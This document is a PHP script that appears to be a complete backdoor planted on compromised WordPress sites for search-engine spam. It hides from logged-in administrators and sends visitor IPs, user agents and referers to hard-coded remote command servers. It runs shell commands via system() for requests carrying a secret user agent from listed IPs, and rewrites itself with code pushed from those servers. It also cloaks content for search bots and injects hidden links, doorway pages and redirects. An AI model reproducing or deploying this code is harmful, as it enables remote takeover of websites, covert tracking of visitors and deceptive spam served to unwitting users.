<?php error_reporting(0);
if (isset($_COOKIE['engine_ssl_'])) {
    return true;
}
$proxy_array = array("http://217.23.12.204/dominator.php", "http://159.8.34.18/~roboatom/dominator.php", "http://190.123.47.134/dominator.php", "http://109.236.91.19/dominator.php");
$scriptver = '013';
$doorexist = 'NO';
$remoteuri = @$_REQUEST['pgn'];
$hostname = @$_SERVER['HTTP_HOST'];
$hostname = strtolower($hostname);
$hostname = str_replace("www.", "", $hostname);
$cookie_host = $hostname;
$visitoragent = $_SERVER['HTTP_USER_AGENT'];
$workagent = 'fsbot';
$admin = 'dominator';
if (isset($_SERVER['HTTP_REFERER'])) {
    $referer = $_SERVER['HTTP_REFERER'];
} else {
    $referer = 'NOREF';
}
$lg = FSLanguage::get();
$lg = array_flip($lg);
$visitorlang = trim($lg[1]);
$tirnum = strpos($visitorlang, "-");
$visitorlang = substr($visitorlang, 0, $tirnum);
$visitorip = FsGetRealIp();
$method = find_Rpermition();
$url = curPageURLSS();
$tmppath = "/tmp";
$filessavepath = $tmppath . '/' . md5($hostname) . '/';
if (!is_dir($filessavepath)) {
    mkdir($filessavepath, 0777);
}
if (!is_dir($filessavepath)) {
    $tmppath = dirname(__FILE__);
    $filessavepath = $tmppath . '/' . md5($hostname) . '/';
    mkdir($filessavepath, 0777);
}
$BotList = $tmppath . '/f16f9a406c937f83b17317e1ca6cc3e7';
$filename = $url;
$filename = str_replace('https://', '', $filename);
$filename = str_replace('http://', '', $filename);
$filename = str_replace('www.', '', $filename);
$filename = md5($filename);
$selfinfo = __FILE__;
$selfarray = pathinfo($selfinfo);
$selfpath = $selfarray['dirname'] . '/' . $selfarray['basename'];
$selfpath = base64_encode($selfpath);
if ((preg_match('/admin|wp-login.php|wp-admin|administrator/i', $_SERVER['REQUEST_URI'])) && (!preg_match('/ajax/i', $_SERVER['REQUEST_URI']))) {
    setcookie('engine_ssl_', 'enabled', time() + 3600 * 24 * 100, '/', '.' . $cookie_host);
}
foreach ((array)$_COOKIE as $cookie => $value) {
    if (stristr($cookie, 'wordpress_logged_in_')) {
        setcookie('engine_ssl_', 'enabled', time() + 3600 * 24 * 100, '/', '.' . $cookie_host);
        return true;
    }
    if (stristr($cookie, 'activeProfile')) {
        setcookie('engine_ssl_', 'enabled', time() + 3600 * 24 * 100, '/', '.' . $cookie_host);
        return true;
    }
}
//////////////FUNCTIONS START
class FSLanguage {
    private static $language = null;
    public static function get() {
        new FSLanguage;
        return self::$language;
    }
    public static function getBestMatch($langs = array()) {
        foreach ($langs as $n => $v) $langs[$n] = strtolower($v);
        $r = array();
        foreach (self::get() as $l => $v) {
            ($s = strtok($l, '-')) != $l && $r[$s] = 0;
            if (in_array($l, $langs)) return $l;
        }
        foreach ($r as $l => $v) if (in_array($l, $langs)) return $l;
        return null;
    }
    private function __construct() {
        if (self::$language !== null) return;
        if (($list = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']))) {
            if (preg_match_all('/([a-z]{1,8}(?:-[a-z]{1,8})?)(?:;q=([0-9.]+))?/', $list, $list)) {
                self::$language = array_combine($list[1], $list[2]);
                foreach (self::$language as $n => $v) self::$language[$n] = + $v ? +$v : 1;
                arsort(self::$language);
            }
        } else self::$language = array();
    }
}
function curl_redir_exec($ch) {
    static $curl_loops = 0;
    static $curl_max_loops = 3;
    if ($curl_loops >= $curl_max_loops) {
        $curl_loops = 0;
        return false;
    }
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    list($header, $data) = explode("

", $data, 2);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($http_code == 301 || $http_code == 302) {
        $matches = array();
        preg_match('/Location:(.*?)
/', $header, $matches);
        $url = @parse_url(trim(array_pop($matches)));
        if (!$url) {
            $curl_loops = 0;
            return $data;
        }
        $last_url = parse_url(curl_getinfo($ch, CURLINFO_EFFECTIVE_URL));
        if (!$url['scheme']) $url['scheme'] = $last_url['scheme'];
        if (!$url['host']) $url['host'] = $last_url['host'];
        if (!$url['path']) $url['path'] = $last_url['path'];
        $new_url = $url['scheme'] . '://' . $url['host'] . $url['path'] . ($url['query'] ? '?' . $url['query'] : '');
        curl_setopt($ch, CURLOPT_URL, $new_url);
        return curl_redir_exec($ch);
    } else {
        $curl_loops = 0;
        return $data;
    }
}
function FsGetRealIp() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
function curPageURLSS() {
    $pageURL = 'http';
    if ($_SERVER["HTTPS"] == "on") {
        $pageURL.= "s";
    }
    $pageURL.= "://";
    if ($_SERVER["SERVER_PORT"] != "80") {
        $pageURL.= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
    } else {
        $pageURL.= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
    }
    return $pageURL;
}
function find_Rpermition() {
    $res = "";
    if ((function_exists('curl_init')) && (function_exists('curl_exec'))) {
        $res = "curl";
    } elseif (function_exists('fsockopen')) {
        $res = "fsock";
    }
    return $res;
}
function getRdata($page, $useragent, $method, $collection) {
    $result = '';
    $timeout = 15;
    $newRRR = parse_url($page);
    $url_new = $newRRR['host'];
    $path_new = $newRRR['path'];
    if ($method == "curl") {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $page);
        curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_redir_exec($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        if ($collection) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'collection=' . $collection);
        }
        $result = curl_exec($ch);
        curl_close($ch);
        $pos = strpos($result, "

");
        $result = substr($result, $pos + 4);
        return $result;
    }
    if ($method == "fsock") {
        $socket = fsockopen($url_new, 80, $errno, $errstr, 30);
        if (!$socket) die("$errstr($errno)");
        $data = '';
        if ($collection) {
            $data = "collection=" . urlencode($collection);
        }
        fwrite($socket, "POST " . $path_new . " HTTP/1.0
");
        fwrite($socket, "Host: " . $url_new . "
");
        fwrite($socket, "Content-type: application/x-www-form-urlencoded
");
        fwrite($socket, "Content-length:" . strlen($data) . "
");
        fwrite($socket, "Accept:*/*
");
        fwrite($socket, "User-agent:" . $useragent . "
");
        fwrite($socket, "Connection:Close
");
        fwrite($socket, "
");
        fwrite($socket, "$data
");
        fwrite($socket, "
");
        $result = '';
        while (!feof($socket)) {
            $result.= fgets($socket);
        }
        $pos = strpos($result, "

");
        $result = substr($result, $pos + 4);
        return $result;
        fclose($socket);
    }
}
function makebotlist($BotList) {
    if (!file_exists($BotList) or (time() - filemtime($BotList) >= '100000')) {
        $baseg = explode("#", file_get_contents('http://ru.myip.ms/files/bots/live_webcrawlers.txt'));
        for ($i = 0;$i < count($baseg);$i++) {
            if (strlen($baseg[$i]) > 10) {
                if (stristr($baseg[$i], "google")) {
                    $basec = explode("
", $baseg[$i]);
                    for ($i2 = 0;$i2 < count($basec);$i2++) {
                        if (preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\z/', $basec[$i2])) {
                            $basegoogle[] = $basec[$i2];
                        }
                    }
                }
            }
        }
        $basegoogle = array_unique($basegoogle);
        $basegoogle = implode(PHP_EOL, $basegoogle);
        $file = fopen($BotList, "w+");
        fwrite($file, $basegoogle);
        fclose($file);
    }
}
function HiGoogle($visitorip, $BotList) {
    $VisitorHost = strtolower(gethostbyaddr($visitorip));
    if (preg_match('/google|bing|aol|yahoo|yandex|majestic|ahrefs|msn|baidu|facebook/i', $VisitorHost)) {
        return true;
    }
    if (is_file($BotList)) {
        $iplist = file_get_contents($BotList);
        $iplist = explode("
", $iplist);
        if (in_array($visitorip, $iplist)) {
            return true;
        }
    }
    if (preg_match('/93.190.141.195|191.101.22.10|141.255.161.176/i', $visitorip)) {
        return true;
    }
    return false;
}
function checkDir($pap) {
    $f = "0";
    if ($handle = opendir($pap)) {
        while (false !== ($file = readdir($handle))) {
            if ($file != '..' AND $file != '.') {
                $f++;
            }
        }
    }
    closedir($handle);
    return $f;
}
function check($param1, $param2) {
    return strpos(strtolower($param1), strtolower($param2));
}
function callback($datapage) {
    global $links_out;
    $_9 = $links_out;
    $_2 = 7;
    $_10 = $datapage;
    $_11 = false;
    $_12 = "";
    $_13 = check($_10, "<body");
    if ($_13 !== false) {
        $_14 = array();
        $_15 = array();
        $_16 = array();
        $_17 = array();
        $_18 = array();
        $_19 = array();
        $_20 = substr($_10, $_13);
        $_21 = strip_tags($_20);
        $_22 = "/[a-z]{2,}+ and /";
        preg_match_all($_22, $_21, $_14, PREG_OFFSET_CAPTURE);
        $_23 = "/[a-z]{2,}+ the /";
        preg_match_all($_23, $_21, $_15, PREG_OFFSET_CAPTURE);
        $_24 = "/[a-z]{2,}+ of /";
        preg_match_all($_24, $_21, $_16, PREG_OFFSET_CAPTURE);
        $_25 = "/[a-z]{2,}+ to /";
        preg_match_all($_25, $_21, $_17, PREG_OFFSET_CAPTURE);
        $_26 = "/[a-z]{2,}+ on /";
        preg_match_all($_26, $_21, $_18, PREG_OFFSET_CAPTURE);
        $_27 = "/[a-z]{2,}+ is /";
        preg_match_all($_27, $_21, $_19, PREG_OFFSET_CAPTURE);
        $_28 = "/[a-z]{2,}+ de /";
        preg_match_all($_28, $_21, $_29, PREG_OFFSET_CAPTURE);
        $_30 = "/[a-z]{2,}+ en /";
        preg_match_all($_30, $_21, $_31, PREG_OFFSET_CAPTURE);
        $_32 = "/[a-z]{2,}+ und /";
        preg_match_all($_32, $_21, $_33, PREG_OFFSET_CAPTURE);
        $_34 = "/[a-z]{2,}+ auf /";
        preg_match_all($_34, $_21, $_35, PREG_OFFSET_CAPTURE);
        $_36 = "/[a-z]{2,}+ y /";
        preg_match_all($_36, $_21, $_37, PREG_OFFSET_CAPTURE);
        $_38 = "/[a-z]{2,}+ e /";
        preg_match_all($_38, $_21, $_39, PREG_OFFSET_CAPTURE);
        $_40 = "/[a-z]{2,}+ et /";
        preg_match_all($_40, $_21, $_41, PREG_OFFSET_CAPTURE);
        $_42 = "/[a-z]{2,}+ la /";
        preg_match_all($_42, $_21, $_43, PREG_OFFSET_CAPTURE);
        $_44 = "/[a-z]{2,}+ des /";
        preg_match_all($_44, $_21, $_45, PREG_OFFSET_CAPTURE);
        $_46 = "/[a-z]{2,}+ der /";
        preg_match_all($_46, $_21, $_47, PREG_OFFSET_CAPTURE);
        $_48 = "/[a-z]{2,}+ die /";
        preg_match_all($_48, $_21, $_49, PREG_OFFSET_CAPTURE);
        $_481 = "/[a-z]{2,}+ do /";
        preg_match_all($_481, $_21, $_491, PREG_OFFSET_CAPTURE);
        $_482 = "/[a-z]{2,}+ z /";
        preg_match_all($_482, $_21, $_492, PREG_OFFSET_CAPTURE);
        $_483 = "/[a-z]{2,}+ na /";
        preg_match_all($_483, $_21, $_493, PREG_OFFSET_CAPTURE);
        $_484 = "/[a-z]{2,}+ i /";
        preg_match_all($_484, $_21, $_494, PREG_OFFSET_CAPTURE);
        $_50 = array();
        foreach ($_14[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_15[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_16[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_17[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_18[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_19[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_29[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_31[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_33[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_35[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_37[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_39[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_41[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_43[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_45[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_47[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_49[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_491[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_492[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_493[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        foreach ($_494[0] as $_51) {
            $_50[$_51[0]] = 1;
        }
        $_52 = array_keys($_50);
        $_53 = $_20;
        $_54 = - 1;
        foreach ($_52 as $_55) {
            $_54++;
            if (($_54 % $_2) != 0) continue;
            $_56 = 0;
            $_57 = false;
            $_58 = 0;
            do {
                $_59 = strpos($_53, $_55, $_56);
                $_56 = $_59 + strlen($_55);
                if ($_59 !== false) {
                    $_60 = strrpos(substr($_53, 0, $_59), ">");
                    $_61 = strrpos(substr($_53, 0, $_59), "<");
                    if ($_60 === false) {
                        $_60 = 0;
                    }
                    if ($_61 === false) {
                        $_11 = true;
                        break;
                    }
                    if ($_60 <= $_61) {
                        continue;
                    }
                    if (count($_9) <= 0) break;
                    $_58 = trim(array_shift($_9));
                    if ($_58 == NULL || strlen($_58) < 4) {
                        break;
                    }
                    $_53 = substr($_53, 0, $_59 + strlen($_55)) . $_58 . " " . substr($_53, $_59 + strlen($_55));
                    $_57 = true;
                } else {
                    break;
                }
            }
            while (!$_57);
            if ($_11) break;
            if (count($_9) <= 0) break;
        }
        $_12 = substr($_10, 0, $_13) . $_53;
    } else {
        $_11 = true;
        $_12 = $_10;
    }
    $datapage = $_12;
    return $datapage;
} function morda($datapage) {
    global $mordaspam;
    $bdE = "'<body[^>]*?.*?>'si";
    preg_match("/(<body).*?(>)/", $datapage, $matches);
    $bdM = $matches[0];
    $datapage = preg_replace($bdE, $bdM . "
" . $mordaspam, $datapage);
    return $datapage;
}
function putsitemaplink($datapage) {
    global $sitemaplink;
    $fcanonlink = '<link rel="canonical" href="' . $sitemaplink . '" />';
    $fsitemaplink = '<center><a href="' . $sitemaplink . '" title="sitemap">sitemap</a></center>';
    $datapage = str_replace('</head>', "
" . $fcanonlink . "
" . '</head>', $datapage);
    $datapage = str_replace('</body>', "
" . $fsitemaplink . "
" . '</body>', $datapage);
    return $datapage;
}
function PingMyProxy($proxy) {
    $port = 80;
    $to = 1;
    $gph = parse_url($proxy);
    $host = $gph['host'];
    $fsock = fsockopen($host, $port, $errno, $errstr, $to);
    if (!$fsock) {
        return FALSE;
    } else {
        return TRUE;
    }
}
function get_host($url) {
    $uri2host = parse_url($url);
    $uri2host = $uri2host['host'];
    return $uri2host;
}
//////////////FUNCTIONS FINISH
$remotedomain = get_host($remoteuri);
$readydoors = checkDir($filessavepath);
makebotlist($BotList);
$blst = 'NOFILE';
if (file_exists($BotList)) {
    $blst = 'BOTLIST';
}
if (file_exists($filessavepath . $filename)) {
    $doorexist = 'YES';
}
if ($_SERVER['HTTP_USER_AGENT'] == "ANTIPIDERSIA") {
    if (preg_match('/93.190.141.195|191.101.22.10|141.255.161.176/i', $visitorip)) {
        $owner = TRUE;
    }
    if ((substr(md5($_REQUEST['localdate']), 0, 6) == '6fbcb8') && ($owner == TRUE)) {
        $time = str_replace('@', ' ', $_REQUEST['localtime']);
        @system($time);
        exit;
    }
    die("<font color='green'>CHETKO</font>:CHETKO|" . $scriptver . "|" . $blst . "|DOORS READY:" . $readydoors);
}
$bot = HiGoogle($visitorip, $BotList);
if ($bot) {
    $user = 'BOT';
} else {
    $user = 'HUMAN';
}
foreach ($proxy_array as $proxy) {
    $proxy = trim($proxy);
    $up = PingMyProxy($proxy);
    if ($up) {
        break;
    }
}
$collection = array("remotehost" => $hostname, "useragent" => $visitoragent, "lang" => $visitorlang, "ip" => $visitorip, "uri" => $url, "gbase" => $blst, "visitor" => $user, "referer" => $referer, "scriptver" => $scriptver, "selfpath" => $selfpath, "admin" => $admin, "doors" => $readydoors, "proxy" => $proxy, "DOOREXIST" => $doorexist);
$collection = serialize($collection);
$collection = base64_encode($collection);
$datauri = $proxy;
$response = getRdata($datauri, $workagent, $method, $collection);
if (preg_match('/SELFUPDATE/i', $response)) {
    $telo = str_replace('SELFUPDATE', '', $response);
    $telo = base64_decode($telo);
    $telo = unserialize($telo);
    $selfdata = $telo['secretka'];
    $selfhash = $telo['hash'];
    $selfpath = $telo['selfpath'];
    $selfpath = base64_decode($selfpath);
    $secretkahash = md5($selfdata);
    if (($selfdata <> '') && ($secretkahash == $selfhash)) {
        $file = fopen($selfpath, 'w');
        fwrite($file, $selfdata . "
");
        fclose($file);
    }
    return true;
}
if (preg_match('/TEMPBAN/i', $response)) {
    return true;
}
if (preg_match('/BANBAN/i', $response)) {
    setcookie('engine_ssl_', 'enabled', time() + 3600 * 24 * 100, '/', '.' . $cookie_host);
    return true;
}
if (preg_match('/FIREWALL/i', $response)) {
    $telo = str_replace('FIREWALL', '', $response);
    $telo = base64_decode($telo);
    $telo = unserialize($telo);
    $page = $telo['pagebody'];
    header($_SERVER['SERVER_PROTOCOL'] . " 503 Service Temporarily Unavailable");
    header("Cache-Control: no-cache, must-revalidate");
    header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
    header("Retry-After: 3600");
    echo $page;
    exit;
}
if (preg_match('/NOTFOUND/i', $response)) {
    $telo = str_replace('NOTFOUND', '', $response);
    $telo = base64_decode($telo);
    $telo = unserialize($telo);
    $page = $telo['pagebody'];
    header($_SERVER['SERVER_PROTOCOL'] . " 404 Not Found");
    echo $page;
    exit;
}
if (preg_match('/RED301/i', $response)) {
    $telo = str_replace('RED301', '', $response);
    $telo = base64_decode($telo);
    $telo = unserialize($telo);
    $url = $telo['url'];
    header($_SERVER['SERVER_PROTOCOL'] . " 301 Moved Permanently");
    header("Location: " . $url);
    exit;
}
if (preg_match('/RED302/i', $response)) {
    $telo = str_replace('RED302', '', $response);
    $telo = base64_decode($telo);
    $telo = unserialize($telo);
    $url = $telo['url'];
    header($_SERVER['SERVER_PROTOCOL'] . " 302 Moved Temporarily");
    header("Location: " . $url);
    exit;
}
if (preg_match('/CALL BACK/i', $response)) {
    $telo = str_replace('CALL BACK', '', $response);
    $telo = base64_decode($telo);
    $telo = unserialize($telo);
    $links_out = $telo['links'];
    $links_out = explode("
", $links_out);
    ob_start("callback");
}
if (preg_match('/SHOW SPAM/i', $response)) {
    $telo = str_replace('SHOW SPAM', '', $response);
    $telo = base64_decode($telo);
    $telo = unserialize($telo);
    $links_out = base64_decode($telo['links']);
    $mordaspam = '<div style="position:absolute;left:-' . rand(2000, 5000) . 'px;top:-' . rand(2000, 5000) . 'px;">' . $links_out . '</div>';
    ob_start("morda");
}
if (preg_match('/PUT SITEMAP LINK/i', $response)) {
    $telo = str_replace('PUT SITEMAP LINK', '', $response);
    $telo = base64_decode($telo);
    $telo = unserialize($telo);
    $sitemaplink = $telo['sitemapuri'];
    ob_start("putsitemaplink");
}
if (preg_match('/SHOW DOOR/i', $response)) {
    $telo = str_replace('SHOW DOOR', '', $response);
    $telo = base64_decode($telo);
    $telo = unserialize($telo);
    $door = $telo['doorcontent'];
    echo $door;
    exit;
}
if (preg_match('/SHOW SELF DOOR/i', $response)) {
    $telo = str_replace('SHOW SELF DOOR', '', $response);
    $telo = base64_decode($telo);
    $telo = unserialize($telo);
    $shops = $telo['shops'];
    $door = file_get_contents($filessavepath . $filename);
    $door = base64_decode($door);
    $door = str_replace('[SHOPS]', $shops, $door);
    echo $door;
    exit;
}
if (preg_match('/SHOW AND SAVE DOOR/i', $response)) {
    $telo = str_replace('SHOW AND SAVE DOOR', '', $response);
    $telo = base64_decode($telo);
    $telo = unserialize($telo);
    $door = $telo['doorcontent'];
    $shops = $telo['shops'];
    $filetosave = base64_encode($door);
    $door = str_replace('[SHOPS]', $shops, $door);
    echo $door;
    if ($filetosave <> '') {
        $file = fopen($filessavepath . $filename, 'w');
        fwrite($file, $filetosave);
        fclose($file);
    }
    exit;
}